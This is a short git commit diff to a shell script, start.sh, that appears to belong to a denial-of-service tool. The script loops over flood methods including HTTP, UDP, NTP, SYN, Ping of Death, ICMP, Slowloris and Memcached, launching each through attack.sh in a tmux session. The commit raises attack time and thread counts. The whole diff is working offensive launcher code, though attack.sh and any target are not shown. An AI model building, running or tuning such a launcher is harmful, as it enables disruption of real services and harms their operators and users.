d53538c6f990020d22f7b0cc5f457c4f73892ed8
peacesender <100615456+peacesender@users.noreply.github.com>
2022-03-01 13:10:13 +0000

    Update start.sh

--- start.sh
+++ start.sh
@@ -4,5 +4,5 @@ attacks=("HTTP" "UDP" "NTP" "SYN" "POD" "ICMP" "Slowloris" "Memcached")
 
 for attack in ${attacks[@]}; do
   tmux kill-session -t "${attack}" 2>/dev/null
-  tmux new-session -d -s "${attack}" "./attack.sh --method ${attack} --time 50 --threads 20"
+  tmux new-session -d -s "${attack}" "./attack.sh --method ${attack} --time 60 --threads 30"
 done
